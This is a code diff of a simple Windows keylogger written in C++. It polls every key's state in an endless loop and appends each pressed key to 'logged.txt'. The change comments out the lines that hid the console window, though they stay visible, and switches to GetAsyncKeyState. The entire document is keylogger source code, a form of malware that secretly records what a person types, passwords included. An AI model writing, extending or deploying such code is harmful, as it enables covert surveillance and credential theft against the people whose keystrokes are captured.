@@ -2,6 +2,7 @@
 #include <fstream>
 #include <windows.h>
 #include <winuser.h>
+#include <time.h>
 using namespace std;
 
 #define LOG_FILE "logged.txt"
@@ -10,13 +11,16 @@ ofstream outputLog (LOG_FILE);
 
 int main()
 {
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
+    // IMPLEMENT SPECIAL CHARACTERS
+
+    // HWND hwnd = GetConsoleWindow();
+    // ShowWindow(hwnd, SW_HIDE);
 
     while (true) {
-        for (int i = 0; i < 256; i++) {
-            if (GetKeyState(i) & 0xF) {
+        for (int i = 8; i <= 190; i++) {
+            if (GetAsyncKeyState((char)i) & 0xF) {
                 outputLog.put((char)i);
+                outputLog.put('\n');
             }
         }
     }
